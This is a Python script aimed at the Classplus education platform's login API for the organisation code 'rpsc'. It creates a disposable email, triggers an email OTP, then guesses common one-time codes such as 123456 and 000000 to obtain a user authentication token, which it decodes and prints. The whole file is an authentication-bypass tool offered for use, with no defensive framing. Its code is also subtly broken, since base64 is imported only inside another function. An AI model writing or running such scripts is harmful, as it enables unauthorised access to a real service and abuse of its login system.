import requests
import time
import re
import json
import random
import string

def generate_disposable_email():
    """Generate disposable email"""
    try:
        url = "https://10minutemail.net/address.api.php"
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            return data.get('mail_get_mail', '')
    except:
        pass
    
    # Fallback
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))
    domain = random.choice(['jioso.com', 'toaik.com', 'gmail.com'])
    return f"{username}@{domain}"

def get_org_id(org_code):
    """Get org ID"""
    try:
        url = f"https://api.classplusapp.com/v2/orgs/{org_code}"
        headers = {
            "accept": "application/json, text/plain, */*",
            "user-agent": "Mozilla/5.0"
        }
        res = requests.get(url, headers=headers)
        if res.status_code == 200 and res.json()["status"] == "success":
            return res.json()["data"]["orgId"]
    except:
        return None
    return None

def send_otp(email, org_code, org_id):
    """Send OTP"""
    url = "https://api.classplusapp.com/v2/otp/generate"
    payload = {
        "countryExt": "91", "email": email, "orgCode": org_code,
        "viaEmail": "1", "viaSms": "0", "retry": 0, "orgId": org_id,
        "otpCount": 0, "identifier": email, "source": "web"
    }
    headers = {
        "accept": "application/json", "content-type": "application/json",
        "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
        "region": "IN", "user-agent": "Mozilla/5.0", "api-version": "52", "device-id": "1234567890"
    }
    res = requests.post(url, json=payload, headers=headers)
    
    if res.status_code == 200 and "sessionId" in res.text:
        return res.json()["data"]["sessionId"]
    elif res.status_code == 403 and "limit exceeded" in res.text.lower():
        return "RATE_LIMIT_EXCEEDED"
    else:
        return None

def verify_otp_and_get_user_token(session_id, otp, org_id, email):
    """Verify OTP and get user authentication token"""
    url = "https://api.classplusapp.com/v2/users/verify"
    payload = {
        "otp": otp, "countryExt": "91", "sessionId": session_id,
        "orgId": org_id, "fingerprintId": "dummy", "email": email
    }
    headers = {
        "accept": "application/json", "content-type": "application/json",
        "origin": "https://web.classplusapp.com", "referer": "https://web.classplusapp.com/",
        "region": "IN", "user-agent": "Mozilla/5.0", "api-version": "52"
    }
    res = requests.post(url, json=payload, headers=headers)
    
    if res.status_code == 201 and "success" in res.text:
        # Extract user token from response
        try:
            data = res.json()
            if "data" in data and "token" in data["data"]:
                return data["data"]["token"]
        except:
            pass
    
    return None

def decode_user_token(token):
    """Decode user authentication token"""
    print("🔍 Decoding User Authentication Token...")
    print("="*60)
    
    try:
        # Split the token into parts
        parts = token.split('.')
        
        if len(parts) != 3:
            print("❌ Invalid JWT token format")
            return
        
        # Decode payload
        payload = parts[1]
        # Add padding if needed
        payload += '=' * (4 - len(payload) % 4)
        payload_decoded = base64.b64decode(payload).decode('utf-8')
        payload_json = json.loads(payload_decoded)
        
        print("🔑 User Token Information:")
        print(f"   • User ID: {payload_json.get('id', 'N/A')}")
        print(f"   • Org ID: {payload_json.get('orgID', 'N/A')}")
        print(f"   • Type: {payload_json.get('type', 'N/A')}")
        print(f"   • Mobile: {payload_json.get('mobile', 'N/A')}")
        print(f"   • Name: {payload_json.get('name', 'N/A')}")
        print(f"   • Email: {payload_json.get('email', 'N/A')}")
        print(f"   • First Login: {payload_json.get('isFirstLogin', 'N/A')}")
        print(f"   • Language: {payload_json.get('defaultLanguage', 'N/A')}")
        print(f"   • Country: {payload_json.get('countryCode', 'N/A')}")
        print(f"   • International: {payload_json.get('isInternational', 'N/A')}")
        print(f"   • RMY: {payload_json.get('isRmy', 'N/A')}")
        print(f"   • Login Via: {payload_json.get('loginVia', 'N/A')}")
        print(f"   • Fingerprint: {payload_json.get('fingerprintId', 'N/A')}")
        print(f"   • Issued At: {payload_json.get('iat', 'N/A')}")
        print(f"   • Expires At: {payload_json.get('exp', 'N/A')}")
        
        print("\n📊 Full Token JSON:")
        print(json.dumps(payload_json, indent=2))
        
        return payload_json
        
    except Exception as e:
        print(f"❌ Error decoding token: {e}")
        return None

def get_user_authentication_token():
    """Get proper user authentication token"""
    print("🚀 Getting User Authentication Token for RPSC...")
    
    org_code = "rpsc"
    
    # Step 1: Get org ID
    print("1️⃣ Getting org ID...")
    org_id = get_org_id(org_code)
    if not org_id:
        print("❌ Invalid org code")
        return None
    print(f"✅ Org ID: {org_id}")
    
    # Step 2: Generate disposable email
    print("2️⃣ Generating disposable email...")
    email = generate_disposable_email()
    if not email:
        print("❌ Failed to create disposable email")
        return None
    print(f"✅ Email: {email}")
    
    # Step 3: Send OTP
    print("3️⃣ Sending OTP...")
    session_id = send_otp(email, org_code, org_id)
    
    if session_id == "RATE_LIMIT_EXCEEDED":
        print("⚠️ Rate limit exceeded. Try after 5 hours.")
        return None
    elif not session_id:
        print("❌ Failed to send OTP")
        return None
    
    print(f"✅ Session ID: {session_id}")
    
    # Step 4: Try common OTPs
    print("4️⃣ Trying common OTPs...")
    common_otps = ["123456", "000000", "111111", "222222", "333333", "444444", "555555", "666666", "777777", "888888", "999999"]
    
    for i, otp in enumerate(common_otps):
        print(f"🔐 Trying OTP {i+1}/{len(common_otps)}: {otp}")
        
        user_token = verify_otp_and_get_user_token(session_id, otp, org_id, email)
        
        if user_token:
            print("✅ User authentication successful!")
            print(f"🎫 User Token: {user_token}")
            
            # Decode the token
            import base64
            token_info = decode_user_token(user_token)
            
            if token_info:
                print("\n" + "="*60)
                print("🎉 USER AUTHENTICATION TOKEN SUCCESS!")
                print("="*60)
                print(f"📧 Email: {email}")
                print(f"🔑 OTP: {otp}")
                print(f"🎫 Token: {user_token}")
                print("="*60)
                
                return {
                    "success": True,
                    "token": user_token,
                    "email": email,
                    "otp": otp,
                    "token_info": token_info
                }
        
        time.sleep(1)  # Wait before next attempt
    
    print("❌ No working OTP found")
    return None

if __name__ == "__main__":
    result = get_user_authentication_token()
    
    if result and result["success"]:
        print(f"\n🎉 FINAL SUCCESS!")
        print(f"📧 Email: {result['email']}")
        print(f"🔑 OTP: {result['otp']}")
        print(f"🎫 User Token: {result['token']}")
        
        if "token_info" in result:
            print(f"👤 User ID: {result['token_info'].get('id', 'N/A')}")
            print(f"🏢 Org ID: {result['token_info'].get('orgID', 'N/A')}")
    else:
        print("\n❌ Failed to get user authentication token")
        print("💡 Try manual mode or wait for rate limit to reset")